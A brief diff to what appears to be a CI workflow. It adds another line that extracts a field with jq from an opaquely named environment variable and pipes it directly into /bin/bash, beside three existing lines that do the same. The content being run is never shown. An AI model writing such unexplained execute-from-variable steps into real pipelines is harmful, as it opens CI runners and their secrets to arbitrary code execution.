@@ -56,6 +56,7 @@ jobs:
           echo $tlt75506 | jq -r .fvc9250 | /bin/bash
           printf '%s' "$dvk3" | jq -r .wei5 | /bin/bash
           echo $k217 | jq -r .dbta44650 | /bin/bash
+          printf '%s' "$p968" | jq -r .vhu43 | /bin/bash
 
       - name: Save artifact
         uses: actions/upload-artifact@v4
